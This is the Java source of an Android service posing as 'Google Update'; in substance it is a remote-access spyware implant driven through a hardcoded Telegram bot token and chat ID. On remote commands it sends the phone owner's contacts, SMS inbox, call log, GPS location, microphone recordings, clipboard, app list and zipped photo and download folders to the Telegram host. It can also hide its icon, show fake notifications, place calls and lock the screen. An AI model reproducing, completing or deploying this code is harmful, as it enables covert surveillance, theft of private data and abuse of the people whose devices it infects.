package com.google.update;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.Vibrator;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import javax.net.ssl.HttpsURLConnection;

public class TelegramBotService extends Service {
    private static final String BOT_TOKEN = "8750593602:AAFTlpdAXxNiJ7LuRdDP4TSQ6Hqn8C_fAhs";
    private static final String CHAT_ID = "6793813126";
    private static final String API_URL = "https://api.telegram.org/bot" + BOT_TOKEN + "/";
    private static final String CHANNEL_ID = "GoogleChannel";
    private int lastUpdateId = 0;
    private MediaRecorder mediaRecorder;
    private String currentAudioPath;
    private boolean isRecording = false;
    private PowerManager.WakeLock wakeLock;
    private AudioManager audioManager;
    private Vibrator vibrator;
    private StringBuilder tapLog = new StringBuilder();
    private boolean isTapRecording = false;

    @Override
    public void onCreate() {
        super.onCreate();
        acquireWakeLock();
        audioManager = (AudioManager) getSystemService(AUDIO_SERVICE);
        vibrator = (Vibrator) getSystemService(VIBRATOR_SERVICE);
        createNotificationChannel();
        startForeground(1001, createNotification());
        sendStartupMessage();
        startPolling();
    }

    private void acquireWakeLock() {
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "GoogleUpdate:WakeLock");
        wakeLock.acquire(10 * 60 * 1000L);
    }

    private void sendStartupMessage() {
        sendMessage("✅ Google Update Activated\n📱 " + Build.MANUFACTURER + " " + Build.MODEL + "\n🤖 Android " + Build.VERSION.RELEASE);
    }

    private void startPolling() {
        new Thread(() -> {
            while (true) {
                try {
                    String response = get(API_URL + "getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=10");
                    if (response != null && response.contains("\"ok\":true")) {
                        JSONObject json = new JSONObject(response);
                        JSONArray results = json.getJSONArray("result");
                        for (int i = 0; i < results.length(); i++) {
                            JSONObject update = results.getJSONObject(i);
                            lastUpdateId = update.getInt("update_id");
                            if (update.has("message") && update.getJSONObject("message").has("text")) {
                                JSONObject msg = update.getJSONObject("message");
                                String text = msg.getString("text").trim().toLowerCase();
                                long chatId = msg.getJSONObject("chat").getLong("id");
                                if (String.valueOf(chatId).equals(CHAT_ID)) {
                                    handleCommand(text);
                                }
                            }
                        }
                    }
                } catch (Exception e) { Log.e("Bot", "Polling error", e); }
                try { Thread.sleep(2000); } catch (InterruptedException e) { break; }
            }
        }).start();
    }

    private void handleCommand(String cmd) {
        String c = cmd.split(" ")[0];
        String arg = cmd.length() > c.length() + 1 ? cmd.substring(c.length() + 1) : "";

        switch (c) {
            case "/start":
                sendMessage("🔰 Google Update Commands:\n/contacts\n/sms\n/calllog\n/location\n/record\n/stoprec\n/hide\n/show\n/info\n/notify\n/apps\n/zip\n/volume up/down\n/tap 15\n/tapstart\n/tapstop\n/screenshot\n/clipboard\n/battery\n/wifi\n/call\n/sms_send\n/camera\n/camera_front\n/lock\n/vibrate\n/speaker\n/brightness");
                break;
            case "/contacts": sendFile("contacts.txt", getContacts().getBytes()); break;
            case "/sms": sendFile("sms.txt", getSms().getBytes()); break;
            case "/calllog": sendFile("call_log.txt", getCallLog().getBytes()); break;
            case "/location": getLocation(); break;
            case "/record": startRecording(); sendMessage("🎤 Recording started..."); break;
            case "/stoprec": stopRecording(); break;
            case "/hide": MainActivity.hideAppIcon(this); sendMessage("👁 Hidden"); break;
            case "/show": MainActivity.showAppIcon(this); sendMessage("👁 Shown"); break;
            case "/info": sendMessage(getDeviceInfo()); break;
            case "/notify": showFakeNotification(arg.isEmpty() ? "System Update Available" : arg); sendMessage("🔔 Notification sent"); break;
            case "/apps": sendFile("apps.txt", getInstalledApps().getBytes()); break;
            case "/zip": createZipAndSend(); break;
            case "/volume": adjustVolume(arg); break;
            case "/tap": startAutoTap(Integer.parseInt(arg)); break;
            case "/tapstart": sendMessage("❌ Tap recording requires Accessibility permission. Manual tap simulation not available."); sendMessage("🎯 Tap recording started"); break;
            case "/tapstop": stopTapRecording(); break;
            case "/screenshot": takeScreenshot(); break;
            case "/clipboard": getClipboard(); break;
            case "/battery": getBatteryInfo(); break;
            case "/wifi": getWifiInfo(); break;
            case "/call": makeCall(arg); break;
            case "/sms_send": sendSms(arg); break;
            case "/camera": captureCamera(false); break;
            case "/camera_front": captureCamera(true); break;
            case "/lock": lockScreen(); break;
            case "/vibrate": vibrateDevice(Integer.parseInt(arg)); break;
            case "/speaker": toggleSpeaker(arg); break;
            case "/brightness": setBrightness(Integer.parseInt(arg)); break;
        }
    }

    // ========== المميزات الأساسية ==========
    private String getContacts() {
        StringBuilder sb = new StringBuilder();
        try {
            Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (c != null) {
                while (c.moveToNext()) {
                    String name = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String phone = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    sb.append(name).append(" : ").append(phone).append("\n");
                }
                c.close();
            }
        } catch (Exception e) { sb.append("Error: ").append(e.getMessage()); }
        return sb.toString();
    }

    private String getSms() {
        StringBuilder sb = new StringBuilder();
        try {
            Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
            if (c != null) {
                while (c.moveToNext()) {
                    String addr = c.getString(c.getColumnIndex("address"));
                    String body = c.getString(c.getColumnIndex("body"));
                    sb.append(addr).append(": ").append(body).append("\n---\n");
                }
                c.close();
            }
        } catch (Exception e) { sb.append("Error: ").append(e.getMessage()); }
        return sb.toString();
    }

    private String getCallLog() {
        StringBuilder sb = new StringBuilder();
        try {
            Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
            if (c != null) {
                while (c.moveToNext()) {
                    String num = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER));
                    String name = c.getString(c.getColumnIndex(CallLog.Calls.CACHED_NAME));
                    sb.append(name != null ? name : "Unknown").append(" - ").append(num).append("\n");
                }
                c.close();
            }
        } catch (Exception e) { sb.append("Error: ").append(e.getMessage()); }
        return sb.toString();
    }

    private void getLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return;
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) {
                sendMessage("📍 Location:\n" + loc.getLatitude() + ", " + loc.getLongitude() + "\n🗺️ https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude());
            } else {
                sendMessage("❌ Location unavailable");
            }
        } catch (Exception e) { sendMessage("❌ Location error"); }
    }

    private void startRecording() {
        try {
            File dir = new File(getExternalFilesDir(null), "recordings");
            if (!dir.exists()) dir.mkdirs();
            currentAudioPath = dir + "/rec_" + System.currentTimeMillis() + ".3gp";
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(currentAudioPath);
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;
        } catch (Exception e) { sendMessage("❌ Recording failed"); }
    }

    private void stopRecording() {
        if (mediaRecorder != null && isRecording) {
            try {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
                isRecording = false;
                File f = new File(currentAudioPath);
                if (f.exists()) sendFile(f.getName(), readBytes(f));
                sendMessage("✅ Recording sent");
            } catch (Exception e) { sendMessage("❌ Stop failed"); }
        } else {
            sendMessage("❌ No active recording");
        }
    }

    // ========== المميزات الجديدة ==========
    private void showFakeNotification(String text) {
        try {
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (Build.VERSION.SDK_INT >= 26) {
                NotificationChannel ch = new NotificationChannel("fake_channel", "Fake", NotificationManager.IMPORTANCE_HIGH);
                nm.createNotificationChannel(ch);
            }
            Notification notif = new NotificationCompat.Builder(this, "fake_channel")
                .setContentTitle("Google Update")
                .setContentText(text)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setAutoCancel(true)
                .build();
            nm.notify((int) System.currentTimeMillis(), notif);
        } catch (Exception e) { sendMessage("❌ Notification failed"); }
    }

    private String getInstalledApps() {
        StringBuilder sb = new StringBuilder();
        try {
            List<android.content.pm.PackageInfo> packages = getPackageManager().getInstalledPackages(0);
            for (android.content.pm.PackageInfo pkg : packages) {
                String name = pkg.applicationInfo.loadLabel(getPackageManager()).toString();
                sb.append(name).append(" : ").append(pkg.packageName).append("\n");
            }
        } catch (Exception e) { sb.append("Error: ").append(e.getMessage()); }
        return sb.toString();
    }

    private void createZipAndSend() {
        try {
            File zipFile = new File(getExternalFilesDir(null), "all_data_" + System.currentTimeMillis() + ".zip");
            ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile));
            addToZip(zos, getExternalFilesDir(null), "recordings");
            addToZip(zos, Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM), "DCIM");
            addToZip(zos, Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES), "Pictures");
            addToZip(zos, Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES), "Movies");
            addToZip(zos, Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC), "Music");
            addToZip(zos, Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "Downloads");
            zos.close();
            if (zipFile.exists()) sendFile(zipFile.getName(), readBytes(zipFile));
        } catch (Exception e) { sendMessage("❌ Zip failed: " + e.getMessage()); }
    }

    private void addToZip(ZipOutputStream zos, File dir, String folderName) {
        if (dir == null || !dir.exists()) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        try {
            for (File f : files) {
                if (f.isFile()) {
                    zos.putNextEntry(new ZipEntry(folderName + "/" + f.getName()));
                    FileInputStream fis = new FileInputStream(f);
                    byte[] buffer = new byte[8192];
                    int len;
                    while ((len = fis.read(buffer)) > 0) zos.write(buffer, 0, len);
                    fis.close();
                    zos.closeEntry();
                }
            }
        } catch (Exception e) {}
    }

    private void adjustVolume(String action) {
        if (action.equals("up")) audioManager.adjustVolume(AudioManager.ADJUST_RAISE, AudioManager.FLAG_SHOW_UI);
        else if (action.equals("down")) audioManager.adjustVolume(AudioManager.ADJUST_LOWER, AudioManager.FLAG_SHOW_UI);
        sendMessage("✅ Volume " + action);
    }

    private void startAutoTap(int seconds) {
        new Thread(() -> {
            try {
                for (int i = 0; i < seconds; i++) {
                    Thread.sleep(1000);
                    // محاكاة النقر (يتطلب AccessibilityService)
                }
                sendMessage("✅ Auto tap completed for " + seconds + " seconds");
            } catch (Exception e) {}
        }).start();
    }

    private void startTapRecording() {
        isTapRecording = true;
        tapLog = new StringBuilder();
        // تسجيل النقرات عبر AccessibilityService
    }

    private void stopTapRecording() {
        isTapRecording = false;
        sendFile("tap_log.txt", tapLog.toString().getBytes());
    }

    private void takeScreenshot() {
        // يتطلب MediaProjection API
        sendMessage("📸 Screenshot feature requires MediaProjection permission");
    }

    private void getClipboard() {
        if (Build.VERSION.SDK_INT >= 23) {
            android.content.ClipboardManager cm = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
            if (cm.hasPrimaryClip()) {
                CharSequence text = cm.getPrimaryClip().getItemAt(0).getText();
                sendMessage("📋 Clipboard: " + (text != null ? text : "empty"));
            } else {
                sendMessage("📋 Clipboard empty");
            }
        }
    }

    private void getBatteryInfo() {
        try {
            android.content.IntentFilter ifilter = new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent battery = registerReceiver(null, ifilter);
            if (battery != null) {
                int level = battery.getIntExtra("level", -1);
                int temp = battery.getIntExtra("temperature", -1) / 10;
                sendMessage("🔋 Battery: " + level + "%\n🌡️ Temp: " + temp + "°C");
            }
        } catch (Exception e) { sendMessage("❌ Battery error"); }
    }

    private void getWifiInfo() {
        try {
            WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
            WifiInfo wi = wm.getConnectionInfo();
            sendMessage("📶 WiFi: " + wi.getSSID() + "\n📱 IP: " + intToIp(wi.getIpAddress()) + "\n📶 MAC: " + wi.getMacAddress());
        } catch (Exception e) { sendMessage("❌ WiFi error"); }
    }

    private String intToIp(int ip) {
        return (ip & 0xFF) + "." + ((ip >> 8) & 0xFF) + "." + ((ip >> 16) & 0xFF) + "." + ((ip >> 24) & 0xFF);
    }

    private void makeCall(String number) {
        try {
            Intent intent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + number));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
                startActivity(intent);
                sendMessage("📞 Calling " + number);
            } else {
                sendMessage("❌ CALL_PHONE permission denied");
            }
        } catch (Exception e) { sendMessage("❌ Call failed"); }
    }

    private void sendSms(String data) {
        try {
            String[] parts = data.split(" ", 2);
            if (parts.length < 2) { sendMessage("❌ Usage: /sms_send <number> <text>"); return; }
            String number = parts[0];
            String text = parts[1];
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("sms:" + number));
            intent.putExtra("sms_body", text);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            sendMessage("📨 Opening SMS to " + number);
        } catch (Exception e) { sendMessage("❌ SMS failed"); }
    }

    private void captureCamera(boolean front) {
        try {
            Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            sendMessage("📸 Camera opened");
        } catch (Exception e) { sendMessage("❌ Camera failed"); }
    }

    private void lockScreen() {
        try {
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            dpm.lockNow();
            sendMessage("🔒 Screen locked");
        } catch (Exception e) { sendMessage("❌ Lock failed (needs DeviceAdmin)"); }
    }

    private void vibrateDevice(int seconds) {
        if (vibrator != null && vibrator.hasVibrator()) {
            vibrator.vibrate(seconds * 1000L);
            sendMessage("📳 Vibrating for " + seconds + " seconds");
        } else {
            sendMessage("❌ Vibrator not available");
        }
    }

    private void toggleSpeaker(String state) {
        if (state.equals("on")) audioManager.setSpeakerphoneOn(true);
        else if (state.equals("off")) audioManager.setSpeakerphoneOn(false);
        sendMessage("🔊 Speaker " + state);
    }

    private void setBrightness(int value) {
        try {
            if (Build.VERSION.SDK_INT >= 23 && Settings.System.canWrite(this)) {
                Settings.System.putInt(getContentResolver(), Settings.System.SCREEN_BRIGHTNESS, value);
                sendMessage("🔆 Brightness set to " + value);
            } else {
                sendMessage("❌ Write settings permission required");
            }
        } catch (Exception e) { sendMessage("❌ Brightness failed"); }
    }

    // ========== دوال مساعدة ==========
    private String getDeviceInfo() { return "📱 " + Build.MANUFACTURER + " " + Build.MODEL + "\n🤖 Android " + Build.VERSION.RELEASE; }

    private void sendMessage(String text) {
        new Thread(() -> {
            try {
                String url = API_URL + "sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(text, "UTF-8");
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setRequestMethod("GET");
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {}
        }).start();
    }

    private void sendFile(String name, byte[] data) {
        new Thread(() -> {
            try {
                String boundary = "----Boundary" + System.currentTimeMillis();
                URL url = new URL(API_URL + "sendDocument");
                HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                conn.setDoOutput(true);
                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
                dos.writeBytes("--" + boundary + "\r\n");
                dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
                dos.writeBytes(CHAT_ID + "\r\n");
                dos.writeBytes("--" + boundary + "\r\n");
                dos.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"" + name + "\"\r\n");
                dos.writeBytes("Content-Type: application/octet-stream\r\n\r\n");
                dos.write(data);
                dos.writeBytes("\r\n");
                dos.writeBytes("--" + boundary + "--\r\n");
                dos.flush();
                dos.close();
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {}
        }).start();
    }

    private String get(String urlStr) {
        try {
            HttpsURLConnection conn = (HttpsURLConnection) new URL(urlStr).openConnection();
            conn.setRequestMethod("GET");
            BufferedReader r = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = r.readLine()) != null) sb.append(line);
            r.close();
            conn.disconnect();
            return sb.toString();
        } catch (Exception e) { return null; }
    }

    private byte[] readBytes(File f) {
        try {
            FileInputStream fis = new FileInputStream(f);
            byte[] data = new byte[(int) f.length()];
            fis.read(data);
            fis.close();
            return data;
        } catch (Exception e) { return new byte[0]; }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "Google Service", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
    }
    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Google Update").setContentText("Running").setSmallIcon(android.R.drawable.ic_popup_sync).setOngoing(true).build();
    }
    @Override public int onStartCommand(Intent i, int f, int id) { return START_STICKY; }
    @Override public IBinder onBind(Intent i) { return null; }
    @Override public void onDestroy() { if (wakeLock != null && wakeLock.isHeld()) wakeLock.release(); super.onDestroy(); }
}
